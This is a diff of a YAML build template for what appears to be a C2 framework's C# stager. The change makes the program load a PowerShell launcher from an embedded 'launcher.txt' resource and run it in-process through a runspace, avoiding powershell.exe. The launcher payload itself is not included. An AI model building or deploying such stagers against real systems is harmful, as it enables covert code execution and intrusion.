@@ -12,10 +12,15 @@
   - Net35
   Code: |
     using System;
+    using System.Resources;
+    using System.Linq;
+    using System.Collections;
     using System.Text;
     using System.Management.Automation;
     using System.Management.Automation.Runspaces;
-
+    using System.IO;
+    using System.Reflection;
+    
     class Program
     {
           public static void Main(string[] args)
@@ -23,11 +28,20 @@
 
             PowerShell ps = PowerShell.Create();
 
-            String script = "{{ REPLACE_LAUNCHER }}";
-            ps.AddScript(System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(script)));
             try
             {
-                ps.Invoke();
+              var assembly = Assembly.GetExecutingAssembly();
+              var resourceName = "launcher.txt";
+
+              string[] names = assembly.GetManifestResourceNames();
+
+              using (StreamReader reader = new StreamReader(assembly.GetManifestResourceStream(resourceName)))
+              {
+                  string script = reader.ReadToEnd();
+                  ps.AddScript(script);
+              }
+              ps.Invoke();
+    
             }
             catch (Exception e)
             {
@@ -48,6 +62,12 @@
     - Name: System.Management.Automation.dll
       Location: net40\System.Management.Automation.dll
       DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
     - Name: System.dll
       Location: net40\System.dll
       DotNetVersion: Net40
@@ -60,4 +80,6 @@
     - Name: mscorlib.dll
       Location: net35\mscorlib.dll
       DotNetVersion: Net35
-  EmbeddedResources: []
+  EmbeddedResources:
+    - Name: launcher.txt
+      Location: launcher.txt
